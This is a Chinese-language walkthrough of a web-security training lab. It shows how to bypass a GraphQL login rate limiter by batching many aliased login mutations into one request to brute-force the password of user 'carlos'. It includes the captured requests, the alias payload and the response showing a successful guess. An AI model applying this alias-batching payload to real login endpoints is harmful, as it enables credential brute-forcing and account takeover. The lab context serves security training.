# 实验室：绕过 GraphQL 暴力破解防护

本实验的用户登录机制由 GraphQL API 提供支持。该 API 端点设有速率限制器，若在短时间内从同一来源收到过多请求，则会返回错误。

要解决本实验，请暴力破解登录机制，以 `carlos` 身份登录。使用 [身份验证实验室密码列表](/web-security/authentication/auth-lab-passwords) 作为密码来源。

详细了解 [在 Burp Suite 中使用 GraphQL](/burp/documentation/desktop/testing-workflow/working-with-graphql)。

> **提示**
> 本实验要求你构造一个大型请求，使用别名同时发送多次登录尝试。手动构造可能耗时，建议使用脚本生成请求。

## 步骤

侦察
- 使用登录功能
    ```http
    POST /graphql/v1 HTTP/2
    Host: id.web-security-academy.net
    Cookie: session=Tz4GTbBUOWWH9gcpn3gotRkWNGX8emzn
    Content-Type: application/json

    {"query":"\n    mutation login($input: LoginInput!) {\n        login(input: $input) {\n            token\n            success\n        }\n    }","operationName":"login","variables":{"input":{"username":"wiener","password":"peter"}}}
    ```

    ```graphql
    mutation login($input: LoginInput!) {
        login(input: $input) {
            token
            success
        }
    }

    {
        "input": {
            "username": "wiener",
            "password": "peter"
        }
    }
    ```

暴破
- 分析 GQL 变更，尝试暴破需多次执行 login 方法，使用别名结构在单次请求中多次执行
- 微调基础变更结构
    ```graphql
    mutation login{
        # 粘贴别名载荷
        bruteforce0: login(input: {
            password: "123456",
            username: "carlos"
        }) {
            token
            success
        }


        bruteforce1: login(input: {
            password: "password",
            username: "carlos"
        }) {
            token
            success
        }
        ...
    }
    ```
    - 使用 lab 的别名构造器，并粘贴别名结构到基础变更结构

    - 响应
        ```json
        "bruteforce48": {
            "token": "DApgOA4LloS22W8AJMYxc7rsw5zJPrdc",
            "success": false
        },
        "bruteforce49": {
            "token": "MLwX2BqIxMJXm6oUPqxQzZwoJTIoGixz",
            "success": true
        },
        "bruteforce50": {
            "token": "MLwX2BqIxMJXm6oUPqxQzZwoJTIoGixz",
            "success": false
        },
        ```
        - 成功批量暴破，复制其中 hit 令牌
        
    - 过程中的失败尝试 `mutation {`
        - 若删除自定义名称或使用除 `login` 外的自定义名称，变更失败，服务器返回
            ```json
            "message": "Unknown operation named 'login'."
            ```
        - 此时查看非 GQL 标签的普通 Pretty 请求标签，发现请求体中包含 `"operationName":"login"`
        - 测试发现
            - 若存在 `operationName` 字段，则变更中的自定义名需匹配
            - 即，`operationName` 字段与变更自定义名需一致
